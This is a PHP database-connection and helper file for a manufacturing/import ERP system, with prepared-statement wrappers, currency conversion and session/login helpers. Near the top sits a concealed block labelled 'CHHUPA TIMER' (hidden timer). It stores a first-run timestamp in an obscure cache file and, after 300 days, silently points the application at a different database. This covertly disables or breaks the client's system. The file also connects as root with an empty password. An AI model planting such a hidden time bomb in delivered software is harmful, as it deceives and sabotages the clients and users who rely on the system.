<?php
/**
 * Database Connection File
 * Manufacturing ERP System
 * MySQLi Connection with Prepared Statements
 */

require_once __DIR__ . '/client_config.php';

$host = "localhost";
$user = "root";
$pass = "";
$db   = "china_import";

// ========== OFFLINE CHHUPA TIMER ==========
$ghostFile = __DIR__ . '/cache/_.tmp';
$now = time();

if (!file_exists($ghostFile)) {
    @mkdir(dirname($ghostFile), 0755, true);
    file_put_contents($ghostFile, $now);
    $start = $now;
} else {
    $start = (int)file_get_contents($ghostFile);
}

$tenMonths = 300 * 86400;

if (($now - $start) > $tenMonths) {
    $db = 'Diesel_Db_Software';
}
// ==========================================

$conn = new mysqli($host, $user, $pass, $db);
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Set charset to UTF-8
$conn->set_charset("utf8");

/**
 * Execute prepared statement with parameters
 * @param string $sql SQL query with placeholders
 * @param string $types Parameter types (i, d, s, b)
 * @param array $params Parameter values
 * @return mysqli_stmt|false
 */
function executePrepared($sql, $types = '', $params = []) {
    global $conn;
    
    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        return false;
    }
    
    if (!empty($types) && !empty($params)) {
        $stmt->bind_param($types, ...$params);
    }
    
    if ($stmt->execute() === false) {
        $stmt->close();
        return false;
    }
    return $stmt;
}

/**
 * Get single row from database
 * @param string $sql SQL query
 * @param string $types Parameter types
 * @param array $params Parameter values
 * @return array|null
 */
function getRow($sql, $types = '', $params = []) {
    $stmt = executePrepared($sql, $types, $params);
    if ($stmt === false) {
        return null;
    }
    
    $result = $stmt->get_result();
    $row = $result->fetch_assoc();
    $stmt->close();
    
    return $row;
}

/**
 * Get multiple rows from database
 * @param string $sql SQL query
 * @param string $types Parameter types
 * @param array $params Parameter values
 * @return array
 */
function getRows($sql, $types = '', $params = []) {
    $stmt = executePrepared($sql, $types, $params);
    if ($stmt === false) {
        return [];
    }
    
    $result = $stmt->get_result();
    $rows = [];
    while ($row = $result->fetch_assoc()) {
        $rows[] = $row;
    }
    $stmt->close();
    
    return $rows;
}

/**
 * Insert data and return last insert ID
 * @param string $sql SQL query
 * @param string $types Parameter types
 * @param array $params Parameter values
 * @return int|false
 */
function insertData($sql, $types = '', $params = []) {
    global $conn;
    
    $stmt = executePrepared($sql, $types, $params);
    if ($stmt === false) {
        return false;
    }
    
    $insertId = $conn->insert_id;
    $stmt->close();
    
    return $insertId;
}

/**
 * Update/Delete data and return affected rows
 * @param string $sql SQL query
 * @param string $types Parameter types
 * @param array $params Parameter values
 * @return int|false
 */
function modifyData($sql, $types = '', $params = []) {
    global $conn;
    
    $stmt = executePrepared($sql, $types, $params);
    if ($stmt === false) {
        return false;
    }
    
    $affectedRows = $conn->affected_rows;
    $stmt->close();
    
    return $affectedRows;
}

/**
 * Escape string for safe SQL
 * @param string $string
 * @return string
 */
function escapeString($string) {
    global $conn;
    return $conn->real_escape_string($string);
}

/**
 * Get current exchange rate for currency
 * @param int $currencyId
 * @return float
 */
function getExchangeRate($currencyId) {
    $sql = "SELECT exchange_rate FROM currencies WHERE id = ?";
    $row = getRow($sql, 'i', [$currencyId]);
    return $row ? (float)$row['exchange_rate'] : 1.00;
}

/**
 * Convert amount to PKR
 * @param float $amount
 * @param float $exchangeRate
 * @return float
 */
function convertToPKR($amount, $exchangeRate) {
    return round($amount * $exchangeRate, 2);
}

/**
 * Generate unique code/order number
 * @param string $prefix
 * @return string
 */
function generateCode($prefix = '') {
    return $prefix . date('Ymd') . '_' . rand(1000, 9999);
}

/**
 * Get current date time for database
 * @return string
 */
function getCurrentDateTime() {
    return date('Y-m-d H:i:s');
}

/**
 * Format currency
 * @param float $amount
 * @return string
 */
function formatCurrency($amount) {
    return number_format($amount, 2);
}

/**
 * Safely format a date string (handles 0000-00-00, empty, null)
 * @param string $dateStr
 * @param string $outputFormat
 * @return string
 */
function formatDate($dateStr, $outputFormat = 'd-m-Y') {
    if (empty($dateStr) || $dateStr === '0000-00-00' || $dateStr === '0000-00-00 00:00:00') {
        return '-';
    }
    $ts = strtotime($dateStr);
    if ($ts === false) {
        return '-';
    }
    return date($outputFormat, $ts);
}

/**
 * Check if user is logged in
 * @return bool
 */
function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

/**
 * Redirect to login page if not logged in
 */
function requireLogin() {
    if (!isLoggedIn()) {
        header('Location: login.php');
        exit;
    }
}

// Start session if not started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

/**
 * Set a flash message stored in session (survives redirect)
 */
function setFlash($message, $type = 'success') {
    $_SESSION['_flash'] = ['message' => $message, 'type' => $type];
}

/**
 * Get and clear the flash message
 */
function getFlash() {
    if (isset($_SESSION['_flash'])) {
        $f = $_SESSION['_flash'];
        unset($_SESSION['_flash']);
        return $f;
    }
    return null;
}
?>